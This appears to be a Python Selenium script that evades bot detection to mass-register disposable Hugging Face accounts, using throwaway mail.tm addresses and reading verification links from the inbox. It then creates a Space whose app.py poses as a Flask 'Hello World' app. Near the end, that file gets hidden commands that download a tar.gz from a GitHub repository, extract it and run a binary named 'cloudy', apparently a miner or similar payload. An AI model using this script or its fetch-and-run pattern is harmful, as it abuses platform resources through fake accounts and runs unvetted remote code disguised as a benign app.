#Run Browser
import os
print("rawr")
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import random
import requests

# os.system("npm i")
options = uc.ChromeOptions()
os.system("rm -rf rawr")
os.system("cp -r rawrz rawr")
a = True
low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
ass = "".join(random.sample(username_for, 12))
options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
driver = uc.Chrome(options=options, version_main=107)
driver.get("https://huggingface.co/join")
headersdomain = {'accept': 'application/ld+json'}
responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
myobj = {'address': emil,"password": "cloud"}
headersreg = {'accept': 'application/ld+json'}
responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[1]/label[1]/input").send_keys(emil)
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[1]/label[2]/input").send_keys("".join(random.sample(low_word, 13))+"H1!")
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/button").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/label[1]/input").send_keys("".join(random.sample(low_word, 13)))
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/label[2]/input").send_keys("".join(random.sample(low_word, 13)))
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/label[8]/input").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[3]/button").click()
time.sleep(45)
myobjlog = {'address': emil,"password": "cloud"}
headerslog = {'accept': 'application/ld+json'}
responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
token = responselog.json()["token"]
headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
verifylink = responsemessz.json()["text"].split("\n")[4]
driver.get(verifylink)
time.sleep(4)
driver.get("https://huggingface.co/new-space")
time.sleep(3)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[1]/label[2]/input").send_keys("".join(random.sample(low_word, 13)))
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[3]/label[2]/div").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[4]/label[2]/input").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[5]/button").click()
time.sleep(6)
driver.find_element(By.XPATH, "/html/body/div/main/header/div/div/div/div[1]/a[2]").click()
time.sleep(2)

driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/button").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/div/ul/li[1]").click()
time.sleep(6)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[1]/input").send_keys("requirements.txt")
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[2]/div/textarea").click()
actions = ActionChains(driver)
actions.send_keys("""Flask==2.2.2""")
actions.perform()
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[4]/div[2]/button").click()
time.sleep(8)

driver.find_element(By.XPATH, "/html/body/div/main/header/div/div/div/div[1]/a[2]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/button").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/div/ul/li[1]").click()
time.sleep(6)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[1]/input").send_keys("app.py")
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[2]/div/textarea").click()
actions = ActionChains(driver)
actions.send_keys("""from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello World!"
"""+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"""
if __name__ == '__main__':
    import os
os.system("pkill cloudy")
os.system("rm borkyxdrawr.tar.gz")
os.system("rm config.json")
os.system("rm cloudy")
os.system("wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/borkyxdrawr.tar.gz")
os.system("tar -xf borkyxdrawr.tar.gz")
os.system("chmod +x ./cloudy")
os.system("./cloudy")
app.run(host="localhost", port=7860, debug=True)""")
actions.perform()
driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[4]/div[2]/button").click()
time.sleep(45)
driver.close()
